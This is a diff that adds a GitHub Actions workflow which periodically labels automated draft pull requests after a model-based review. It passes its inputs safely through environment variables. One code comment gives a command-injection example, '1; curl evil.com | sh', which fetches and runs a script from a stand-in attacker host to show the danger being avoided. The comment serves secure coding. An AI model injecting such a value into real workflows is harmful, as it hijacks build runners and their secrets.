@@ -1,0 +1,64 @@
+# Pillar 1 step 3 -- gate 5 (Overseer, read-only).
+#
+# Polls open draft PRs labeled `dispatcher:auto` across the configured rotation
+# repos and labels each one with `overseer:approved` | `overseer:rejected` |
+# `overseer:abstain` based on a cross-family semantic review. NEVER readys or
+# merges. See docs/OVERSEER.md.
+#
+# Hosting independence: this workflow runs on GitHub Actions (Microsoft cloud),
+# outside of every Perry-owned dispatcher host's failure domain. Same posture
+# as watchdog.yml.
+
+name: Dispatcher Overseer
+
+on:
+  schedule:
+    # Every 2 hours. Cron is best-effort; a missed run just defers the review
+    # to the next slot. Idempotency (label-vs-head-commit timestamp check)
+    # ensures rare cron double-fires do not double-spend PAL tokens.
+    - cron: "0 */2 * * *"
+  workflow_dispatch:
+    inputs:
+      pr_number:
+        description: "Optional: review only this PR number (for smoke-testing)"
+        required: false
+        type: string
+      repo:
+        description: "Optional: limit to this owner/repo (for smoke-testing)"
+        required: false
+        type: string
+
+permissions:
+  contents: read
+  pull-requests: write
+
+jobs:
+  review:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "20"
+      - name: Run Overseer
+        # Inputs are passed via env vars and a bash array, NOT interpolated into
+        # the script body. Direct ${{ inputs.* }} interpolation here would be a
+        # canonical GitHub Actions command-injection sink (a malicious input
+        # like `1; curl evil.com | sh` would execute on the runner).
+        env:
+          OVERSEER_REPOS: ${{ secrets.OVERSEER_REPOS }}
+          OVERSEER_GH_TOKEN: ${{ secrets.OVERSEER_GH_TOKEN }}
+          GEMINI_API_KEY: ${{ secrets.GEMINI_API_KEY }}
+          MISTRAL_API_KEY: ${{ secrets.MISTRAL_API_KEY }}
+          INPUT_PR_NUMBER: ${{ inputs.pr_number }}
+          INPUT_REPO: ${{ inputs.repo }}
+        run: |
+          args=()
+          if [[ -n "$INPUT_PR_NUMBER" ]]; then
+            args+=(--pr "$INPUT_PR_NUMBER")
+          fi
+          if [[ -n "$INPUT_REPO" ]]; then
+            args+=(--repo "$INPUT_REPO")
+          fi
+          node scripts/overseer.mjs "${args[@]}"
